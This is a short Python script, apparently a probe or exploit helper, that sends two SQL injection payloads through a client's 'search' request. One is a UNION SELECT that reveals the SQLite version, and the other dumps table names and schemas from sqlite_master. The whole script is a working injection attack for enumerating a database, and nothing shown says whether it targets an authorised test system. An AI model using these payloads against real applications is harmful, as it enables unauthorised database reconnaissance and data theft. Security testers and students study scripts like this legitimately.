from client import GhostClient
import json

c = GhostClient()
c.bootstrap()

def test_query(sq):
    res = c.request("search", {"q": sq})
    return res

print("SQLite sqlite_version():", test_query("' UNION SELECT 1, sqlite_version(), 3--"))
print("SQLite sqlite_master:", test_query("' UNION SELECT 1, name, sql FROM sqlite_master--"))
